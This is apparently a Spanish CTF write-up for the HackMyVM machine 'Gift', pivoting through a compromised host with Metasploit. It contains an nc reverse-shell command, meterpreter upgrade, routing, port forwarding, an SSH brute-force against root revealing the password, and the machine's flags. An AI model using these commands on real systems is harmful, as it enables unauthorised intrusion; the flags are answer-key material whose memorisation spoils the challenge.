---
tags:
  - CTF
  - estado/completo
plataforma: "[[HackMyVM]]"
web: https://hackmyvm.eu/machines/machine.php?vm=gift
dificultad: Fácil
os: Linux
relacionados:
  - "[[hydra]]"
  - "[[msfconsole]]"
  - "[[02 - Herramientas/ssh|ssh]]"
---
##### Resolución haciendo pivoting desde la maquina `Blog`

#  HackMyVM - Gift

## Reconocimiento

Estoy buscando una forma de acceder a la maquina victima a través de una maquina intermediaria `blog` usando [[MetaSploit Framework]]

Para eso, lo primero que necesito hacer es obtener un shell de tipo meterpreter, para eso una de las formas es obtener una shell normal para luego actualizarla a una shell meterpreter. 

### Configuración inicial

1. Inicio un listener con la IP de la máquina atacante:
```bash
use multi/handler
```
Con eso me pongo en escucha con la ip de la maquina atacante.

2. Mando un `nc` desde blog.
```bash
nc <IP> <PUERTO> -e /bin/bash
```
Acá obtengo la misma sesión que ya tenía en la maquina `Blog`, pero desde acá la puedo actualizar a una meterpreter. A continuación lo que hago es llevarla a segundo plano con `ctrl + z`

### Actualización de shell a meterpreter

1. Utilizo el módulo para actualizar la shell a meterpreter:
```
use shell_to_meterpreter
```

2. Seteo los parametros que hacen falta. 

Meterpreter tiene comandos propios como `getuid` o comandos típicos pero que cambian visualmente como `ifconfig`. También se puede abrir una `shell` normal de nuevo al ejecutar el comando con el mismo nombre.

3. Nuevamente pongo `ctrl + z`

---

## Análisis de vulnerabilidades

### Configuración de rutas

Con el comando `route` puedo ver las rutas configuradas.

1. Agrego manualmente una ruta a la red:
```
route add <ip/24> <Numero de sesion con meterpreter>
```
o
2. Puedo usar un módulo para configurar rutas automáticamente con una sesión activa:
```
use multi/manage/autoroute
```
Con ese modulo sólo tengo que pasarle la sesión ya que detecta automaticamente los segmentos de red a los que tiene acceso esa maquina intermediaria. 
tipicos

Con la ruta configurada paso a tener acceso a ese segmento de red. 

Las rutas se pueden eliminar con: `route del <ruta entera (ip/24)> <sesion>`

### Escaneo de puertos
Los escaneos los voy a hacer usando el pseudo nmap de metasploit, si quisiera usar las herramientas del sistema podría usar metasploit para conectar los puertos con [[proxychains]].

1. Utilizo el módulo de escaneo TCP:
```
use auxiliary/scanner/portscan/tcp
```
- Resultado: Detectados los puertos 22 (SSH) y 80 (HTTP).
- Restricción: No hay acceso directo desde la máquina atacante a la web del puerto 80.

---

## Explotación de vulnerabilidades

### Redirección de puertos

El direccionamiento de rutas no aplica fuera de metasploit, pero sí lo hace el redireccionamiento de puertos.
#### Configuración de port forwarding

1. Desde la shell con meterpreter hago portforwarding:
```
portfwd add -l 8080 -p 80 -r <ip victima>
```
- -l 8080: Especifica el puerto local en tu máquina (atacante) al que el tráfico será enviado.
- -p 80: Define el puerto en la máquina remota (víctima) al que el tráfico será reenviado.
- -r <ip víctima>: Indica la dirección IP de la máquina remota a la que se redirigirá el tráfico desde tu máquina atacante.

2. Verifico redirecciones activas:
```
portfwd
```

3. Accedo a la web en el navegador desde `localhost:8080`.

- Resultado: Acceso logrado, pero no se encuentra información útil en la web.

#### Ataque al servicio SSH

1. Busco y utilizar el módulo de ataque:
```
search ssh_login
use 0
```

2. Configuro el usuario:
```
set username root
```

3. Resultado:
- Contraseña encontrada: `simple`.
- Se abre automáticamente una sesión SSH en el contexto de Metasploit.

#### Gestión de sesiones

1. Listo las sesiones activas:
```
sessions
```

2. Interactuo con una sesión específica:
```
sessions 3
```

3. Confirmo acceso:
```
whoami
```

- Resultado: Acceso exitoso a la máquina objetivo.

#### Alternativa: Redirigir el puerto SSH

1. Configuro redirección del puerto 22 de la víctima al puerto 2222 de la máquina atacante:
```
portfwd add -l 2222 -p 22 -r <ip victima>
```

2. Inicio sesión SSH desde la máquina atacante:
```
ssh root@localhost -p 2222
# Contraseña: simple
```

- Diferencia: Se utiliza la IP de la máquina local para la conexión.

---

## Bandera(s)

> [!FLAG] `flag{user}`
> HMV665sXzDS
^bandera

> [!FLAG] `flag{root}`
> HMVtyr543FG
^bandera

